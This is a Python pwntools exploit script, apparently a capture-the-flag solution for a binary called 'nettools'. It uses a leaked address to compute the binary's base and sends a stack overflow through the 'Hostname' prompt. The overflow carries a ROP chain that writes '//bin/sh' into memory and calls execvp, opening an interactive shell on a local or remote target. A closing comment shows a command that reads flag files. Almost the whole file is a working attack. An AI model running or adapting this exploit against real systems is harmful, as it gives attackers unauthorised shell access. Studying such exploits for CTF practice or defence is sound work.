from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./nettools")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

r.recvuntil(b'is leaked: ')
leak = int(r.recvline().strip().decode(),16)
print("leak",hex(leak))
r.sendlineafter(b'> ',b'3')
base = leak - 499772

from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = base
rebase_0 = lambda x : p(x + IMAGE_BASE_0)
# no pop rdx gadget in this large binary, what a shame
rop = b''
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += b'//bin/sh'
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a000)
rop += rebase_0(0x000000000002b9cb) # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a008)
rop += rebase_0(0x000000000002b9cb) # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a000)
rop += rebase_0(0x0000000000009c18) # 0x0000000000009c18: pop rsi; ret;
rop += rebase_0(0x000000000007a008)
# 0x00000000000420A5 is call    cs:execvp_ptr, it'll call execvp got and int execvp(const char *file, char *const argv[]);
# And we're done!
# I found this by searching "system call" functions like system, exec* in the binary and find xref
rop += rebase_0(0x00000000000420A5)
r.sendlineafter(b'Hostname: ',b'A' * 399 + b'\x00' + cyclic(344) + rop)
r.interactive()

'''
cat /home/`whoami`/f*

'''